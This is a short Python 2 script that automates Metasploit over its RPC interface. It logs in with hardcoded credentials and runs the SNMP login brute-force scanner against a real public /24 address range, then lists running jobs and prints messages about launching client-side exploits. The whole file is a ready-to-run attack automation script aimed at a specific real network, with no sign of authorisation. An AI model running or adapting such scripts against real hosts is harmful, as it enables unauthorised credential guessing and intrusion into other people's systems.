

#load msgrpc Pass=abc123

import msfrpc,sys,time


def reader():
	time.sleep(1)
	while True:
		resource = client.call('console.read',[console_id])
		if len(resource['data']) > 1:
			print resource['data']
		if resource['busy'] == True:
			time.sleep(1)
			continue
		break


username1='msf'
password1='abc123'

client = msfrpc.Msfrpc({})
client.login(username1,password1)

resource = client.call('console.create')
console_id = resource['id']
print console_id
time.sleep(10)

#infile = open (sys.argv[1], 'r')
#commands = infile.readlines()
#infile.close()
i="59.178.62.0/24"
commands=["use auxiliary/scanner/snmp/snmp_login\n","set RHOSTS "+str(i)+"\n","run\n"]

for i in range(1):

	for line in commands:
		resource = client.call('console.write',[console_id, line])
		reader()
		if "exploit" in line:
			print "[!] Attempting to kick off exploit!"

	print "[+] Clientside exploits loaded, checking to see if they came up cleanly"
	resource= client.call('job.list')
	if "error" not in resource:
		print "[+] Listing jobs..."
		print resource
	elif "error" in resource:
	    print "[-] An error has occurred.\n"
	    print resource
	else:
	    print "[-] No jobs or jobs failed. Please check rc syntax"
